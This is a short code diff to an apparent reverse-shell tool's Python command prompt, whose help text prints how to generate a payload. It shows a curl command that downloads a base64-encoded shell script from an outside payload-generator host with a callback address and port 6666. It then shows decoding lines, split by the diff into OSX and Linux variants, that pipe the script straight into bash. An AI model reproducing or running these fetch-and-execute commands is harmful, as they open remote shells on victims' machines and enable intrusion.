@@ -95,7 +95,8 @@ class MyPrompt(Cmd):
         print("")
         print("Generate payload:")
         print("curl -X GET -G https://ghostshell.de/payloads/gen_payload.php -d ip=wslab.de -d port=6666 -d os=osx -d enc=base64 -o shell.sh")
-        print("base64 -D -in shell.sh | bash")
+        print("OSX: base64 -D -in shell.sh | bash")
+        print("LINUX: base64 -d shell.sh | bash")
         print("")
 
     def do_exit(self, inp):
